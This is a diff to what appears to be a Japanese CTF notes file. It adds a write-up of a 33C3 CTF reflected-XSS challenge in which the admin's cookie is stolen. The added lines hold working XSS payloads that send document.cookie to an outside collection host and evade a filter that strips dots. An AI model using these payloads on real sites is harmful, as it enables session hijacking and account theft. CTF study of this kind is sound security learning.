@@ -463,10 +463,38 @@ await page.click('button[type=submit]');
   <button type="submit">ダミーボタンだよ</button>
 </form>
 ```
-## 
+## Reflected / Get Admin's Cookie through bypass "." (33C3 CTF )
+https://ctftime.org/writeup/5211   
+https://kimiyuki.net/writeup/ctf/2016/33c3-ctf-yoso/   
 - **entrypoint**   
+- アクセスできるファイル   
+   - `/register.php//login.php/logout.php`: 何もなさそう   
+   - `/search.php`: 検索ができる   
+   - `/bookmark.php`: POSTすればzipが鯖上に生成される   
+   - `/download.php`: そのzipを削除しつつ取得   
+   - `/feedback.php`: linkを送るとAdminが鯖上で踏んでjsを実行してくれる   
+`download.php`にReflected XSSの脆弱性があるらしい。Adminにリンクを送信して踏ませることができるので、XSSによる任意のJSをAdminにこの通信上で実行させることができる！   
+`/feedback.php`で攻撃者サーバーにアクセスさせて、`document.cookie`をするJSを実行させても、攻撃者サーバーとの通信間ではCookieは当然ながら存在しないので何も得られない。   
+対象サーバー上のXSSによるJSを実行すれば、AdminのCookieを得られる！   
+AdminのCookieを得て攻撃者サーバーに送信させるか、もしくはAdminしかアクセスできないflag.zipをXMLHttpRequestでゲットしてそれを攻撃者サーバーに送信させる方法がある。   
+前者の方が楽。   
+   
 - **概要**   
-- **Payload**   
+以下のようにしてCookieを送信させたいが、`.`が消去されてしまうらしい。  
+```txt
+location.href = "http://requestb.in/18o1k6g1?" + document.cookie;
+```
+以下のようにしてバイパスできる。   
+```txt
+// "."を"\x2e"としてevalする
+http://78.46.224.80:1337/download.php?zip=<script>eval("location\x2ehref=\"http://requestb\x2ein/18o1k6g1?\"+document\x2ecookie;")</script>
+
+// IPアドレスを数値に直す
+// window.locationをwindow["location"]に、document.cookieをdocument["cookie"]に
+// "string" + "string" -> "string"["concat"]("string")
+<script>window["location"] = "http://1558071511/itWorks!"["concat"](document["cookie"]) </script>
+```
+ちなみに、XMLHttpRequestでflag.zipをゲットする方針では、CSRFトークン付きでないとダメなので、CSRFトークンを取得してからじゃないとダメでめんどくさい…   
 ## 
 - **entrypoint**   
 - **概要**   
